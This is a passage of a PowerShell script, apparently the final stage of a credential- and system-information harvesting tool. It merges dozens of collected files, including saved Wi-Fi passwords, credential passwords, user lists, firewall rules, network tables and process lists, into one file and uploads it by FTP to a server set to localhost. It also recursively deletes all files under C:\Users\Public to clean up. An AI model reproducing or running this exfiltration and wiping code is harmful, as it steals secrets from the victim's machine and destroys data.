    $global:DiskList = $null

    #Delete all files created by program in C:\Users\Default\Searches
    remove-item C:\Users\Public\* -recurse

    #Run cleaner program. Also clears directory to which all files were saved to (Kills processes first)
    #cmd.exe /k cleaner.bat
}

function Upload(){
	#Add all files into one txt file
	get-content C:\Users\Public\Output.txt, C:\Users\Public\OSVer.txt, C:\Users\Public\GetCurrentWifiPW.txt, C:\Users\Public\AllWirelessProfiles.txt, C:\Users\Public\PublicIP.txt, C:\Users\Public\InternalIP.txt, C:\Users\Public\GetCredPW.txt, C:\Users\Public\CompNetInfo.txt, C:\Users\Public\IndivUserInfo.txt, C:\Users\Public\Processes.txt, C:\Users\Public\InstalledPrgs.txt, C:\Users\Public\GetCredPW.txt, C:\Users\Public\Log.txt, C:\Users\Public\Output.txt, C:\Users\Public\GetUserName.txt, C:\Users\Public\GetIndivUsers.txt, C:\Users\Public\GetDirIndivUsers.txt, C:\Users\Public\GetDirLocalUsers.txt, C:\Users\Public\GetDirProgramFiles.txt, C:\Users\Public\GetDirProgramFilesx86.txt, C:\Users\Public\ShowFirewallExport.txt, C:\Users\Public\ShowFirewallAll.txt, C:\Users\Public\ShowFirewallCurrent.txt, C:\Users\Public\ShowFirewallGlobal.txt, C:\Users\Public\ShowFirewallStore.txt, C:\Users\Public\ShowFirewallConsecRules.txt, C:\Users\Public\ShowFirewallRules.txt, C:\Users\Public\ShowFirewallMainModeRules.txt, C:\Users\Public\GetSchedTasks.txt, C:\Users\Public\GetFSInfo.txt, C:\Users\Public\GetComInfo.txt, C:\Users\Public\GetSysInfo.txt, C:\Users\Public\GetTree.txt, C:\Users\Public\GetDiskTree.txt, C:\Users\Public\GetUserTree.txt, C:\Users\Public\GetNetStat.txt, C:\Users\Public\GetArpList.txt, C:\Users\Public\GetRoutingTable.txt, C:\Users\Public\GetDiskDir.txt | add-content C:\Users\Public\AllAttachments.txt

	#Uploads all files to FTP server before being cleaned up
	#Create the FtpWebRequest and configure it
	$ftp = [System.Net.FtpWebRequest]::Create("ftp://localhost/AllAttachments.txt")
	$ftp = [System.Net.FtpWebRequest]$ftp
	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
	#$ftp.Credentials = new-object System.Net.NetworkCredential("anonymous","anonymous@localhost")
	$ftp.UseBinary = $true
	$ftp.UsePassive = $true
	
	#Read in the file to upload as a byte array
	$content = [System.IO.File]::ReadAllBytes("C:\Users\Public\AllAttachments.txt")
	$ftp.ContentLength = $content.Length
	
	#Get the request stream, and write the bytes into it
	$rs = $ftp.GetRequestStream()
	$rs.Write($content, 0, $content.Length)
	$rs.Close()
	$rs.Dispose()
}
	
function UploadBackup(){
	#Add all files into one txt file
	get-content C:\Users\Public\Output.txt, C:\Users\Public\OSVer.txt, C:\Users\Public\GetCurrentWifiPW.txt, C:\Users\Public\AllWirelessProfiles.txt, C:\Users\Public\PublicIP.txt, C:\Users\Public\InternalIP.txt C:\Users\Public\NetworkConnectionInfo.txt, C:\Users\Public\CompNetInfo.txt, C:\Users\Public\IndivUserInfo.txt, C:\Users\Public\Processes.txt, C:\Users\Public\InstalledPrgs.txt, C:\Users\Public\GetCredPW.txt, C:\Users\Public\Log.txt, C:\Users\Public\Output.txt, C:\Users\Public\GetUserName.txt, C:\Users\Public\GetIndivUsers.txt, C:\Users\Public\GetDirIndivUsers.txt, C:\Users\Public\GetDirLocalUsers.txt, C:\Users\Public\GetDirProgramFiles.txt, C:\Users\Public\GetDirProgramFilesx86.txt, C:\Users\Public\ShowFirewallExport.txt, C:\Users\Public\ShowFirewallAll.txt, C:\Users\Public\ShowFirewallCurrent.txt, C:\Users\Public\ShowFirewallGlobal.txt, C:\Users\Public\ShowFirewallStore.txt, C:\Users\Public\ShowFirewallConsecRules.txt, C:\Users\Public\ShowFirewallRules.txt, C:\Users\Public\ShowFirewallMainModeRules.txt, C:\Users\Public\GetSchedTasks.txt, C:\Users\Public\GetFSInfo.txt, C:\Users\Public\GetComInfo.txt, C:\Users\Public\GetSysInfo.txt, C:\Users\Public\GetTree.txt, C:\Users\Public\GetDiskTree.txt, C:\Users\Public\GetUserTree.txt, C:\Users\Public\GetNetStat.txt, C:\Users\Public\GetArpList.txt, C:\Users\Public\GetRoutingTable.txt, C:\Users\Public\GetDiskDir.txt | add-content C:\Users\Public\AllAttachments.txt

	#Uploads all files to FTP server before being cleaned up
	#Create the FtpWebRequest and configure it
	$ftp = [System.Net.FtpWebRequest]::Create("ftp://localhost/AllAttachments.txt")
	$ftp = [System.Net.FtpWebRequest]$ftp
	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
	#$ftp.Credentials = new-object System.Net.NetworkCredential("anonymous","anonymous@localhost")
	$ftp.UseBinary = $true
	$ftp.UsePassive = $true
	
	#Read in the file to upload as a byte array
	$content = [System.IO.File]::ReadAllBytes("C:\Users\Public\AllAttachments.txt")
	$ftp.ContentLength = $content.Length
	
	#Get the request stream, and write the bytes into it
	$rs = $ftp.GetRequestStream()
	$rs.Write($content, 0, $content.Length)
	$rs.Close()
	$rs.Dispose()
}

&Main